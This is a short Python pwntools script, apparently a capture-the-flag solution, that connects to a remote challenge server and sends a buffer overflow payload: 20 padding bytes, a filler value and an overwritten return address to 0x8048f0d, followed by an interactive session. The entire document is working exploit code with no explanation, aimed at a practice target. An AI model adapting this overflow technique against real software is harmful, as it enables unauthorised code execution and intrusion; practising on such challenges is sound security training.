from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28319)

payload = b'I' * 20 + p32(0xdeadbeef) + p32(0x8048f0d)

io.sendline(payload)

io.interactive()